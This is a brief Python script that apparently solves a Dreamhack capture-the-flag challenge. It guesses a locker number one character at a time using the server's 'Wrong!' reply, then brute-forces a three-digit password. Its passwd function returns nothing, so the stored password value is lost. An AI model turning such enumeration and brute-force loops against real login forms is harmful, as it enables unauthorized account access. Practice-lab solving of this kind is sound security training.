import requests
import string


def locker(url):
    alphanumeric = string.ascii_lowercase + string.digits
    text = ""
    for num in range(4):
        for i in alphanumeric:
            data = {"locker_num": text + i}
            response = requests.post(url, data=data)
            if "Wrong!" not in response.text:
                # print(str(num + 1) + ": " + i)
                text += i
                break
    print("locker_num : " + text)
    return text


def passwd(url, num):
    password = ""
    for i in range(100, 200):
        data = {"locker_num": num, "password": str(i)}
        response = requests.post(url, data=data)
        if "Good" not in response.text:
            password = str(i)
            break
    print("password : " + password)


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:9844"
    locker_num = locker(url)
    password = passwd(url, locker_num)
